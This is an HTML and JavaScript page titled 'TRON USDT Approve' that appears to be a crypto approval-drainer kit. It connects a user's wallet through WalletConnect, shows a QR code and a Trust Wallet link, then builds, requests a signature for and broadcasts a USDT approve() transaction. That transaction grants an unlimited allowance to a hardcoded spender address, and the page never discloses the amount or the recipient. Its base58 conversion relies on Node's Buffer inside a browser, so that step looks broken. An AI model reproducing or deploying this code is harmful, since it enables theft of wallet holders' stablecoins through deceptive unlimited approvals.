<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TRON USDT Approve</title>

<style>
body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
.card{max-width:520px;margin:auto;background:#111;padding:20px;border-radius:12px}
.step{padding:10px;margin:10px 0;background:#0d0d0d;border-left:4px solid #333}
.active{border-color:#f0a500}
.done{border-color:#22c55e}
.error{border-color:#ef4444}
#qr{margin-top:20px}
#uri{font-size:11px;word-break:break-all;margin-top:10px;color:#aaa}
a{color:#4da3ff}
</style>
</head>

<body>

<div class="card">
<h2>🔐 TRON USDT Approve</h2>

<div id="s1" class="step">Connect Wallet</div>
<div id="s2" class="step">Wallet</div>
<div id="s3" class="step">Build TX</div>
<div id="s4" class="step">Sign</div>
<div id="s5" class="step">Broadcast</div>

<div id="qr"></div>
<div id="uri"></div>
<a id="openWallet" target="_blank"></a>

<pre id="log"></pre>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const TRONGRID = "https://api.trongrid.io";

const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client;
let session;

function step(id,state){
  document.getElementById(id).className = "step " + state;
}

function log(msg){
  document.getElementById("log").textContent += msg + "\n";
}

// 🔥 STABLE BASE58 → HEX (NO API)
import bs58 from "https://esm.sh/bs58";

function tronToHex(addr){
  const bytes = bs58.decode(addr);
  return Buffer.from(bytes).toString("hex").slice(0,42);
}

// encode approve
function encodeApprove(spenderHex){
  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
  return "095ea7b3" + clean + "f".repeat(64);
}

// build TX
async function buildTx(owner){
  const ownerHex = tronToHex(owner);

  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      owner_address: ownerHex,
      contract_address: USDT_HEX,
      function_selector:"approve(address,uint256)",
      parameter: encodeApprove(tronToHex(SPENDER)),
      fee_limit:100000000,
      call_value:0,
      visible:false
    })
  });

  const data = await res.json();

  if(!data.transaction) throw "TX build failed";

  return data.transaction;
}

// broadcast
async function broadcast(tx){
  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(tx)
  });
  return await res.json();
}

// fix signature
function fixSig(resp, tx){
  if(resp?.signature){
    tx.signature = Array.isArray(resp.signature)
      ? resp.signature.map(s => s.replace(/^0x/,""))
      : [resp.signature.replace(/^0x/,"")];
  }
  return tx;
}

// show QR + link
function showQR(uri){
  document.getElementById("qr").innerHTML = "";

  new QRCode(document.getElementById("qr"), {
    text: uri,
    width:200,
    height:200
  });

  document.getElementById("uri").textContent = uri;

  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
  document.getElementById("openWallet").href = link;
  document.getElementById("openWallet").textContent = "Open in Trust Wallet";
}

// 🔥 SINGLE CONNECT (NO LOOP)
async function connectWallet(){
  step("s1","active");

  const { uri, approval } = await client.connect({
    requiredNamespaces:{
      tron:{
        methods:["tron_signTransaction"],
        chains:[TRON_CHAIN],
        events:[]
      }
    }
  });

  showQR(uri);

  session = await approval();

  step("s1","done");
}

// MAIN FLOW
async function main(){
  try{
    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"TRON Approve",
        description:"USDT approve",
        url:location.origin,
        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
      }
    });

    await connectWallet();

    const wallet = session.namespaces.tron.accounts[0].split(":")[2];

    step("s2","done");
    log("Wallet: " + wallet);

    step("s3","active");

    const tx = await buildTx(wallet);

    step("s3","done");

    step("s4","active");

    const signed = await client.request({
      topic: session.topic,
      chainId: TRON_CHAIN,
      request:{
        method:"tron_signTransaction",
        params:{ transaction: tx }
      }
    });

    const finalTx = fixSig(signed, tx);

    step("s4","done");

    step("s5","active");

    const result = await broadcast(finalTx);

    if(result.result){
      step("s5","done");
      log("SUCCESS: " + result.txid);
    }else{
      throw JSON.stringify(result);
    }

  }catch(e){
    step("s5","error");
    log("ERROR: " + e);
    console.error(e);
  }
}

main();
</script>

</body>
</html>
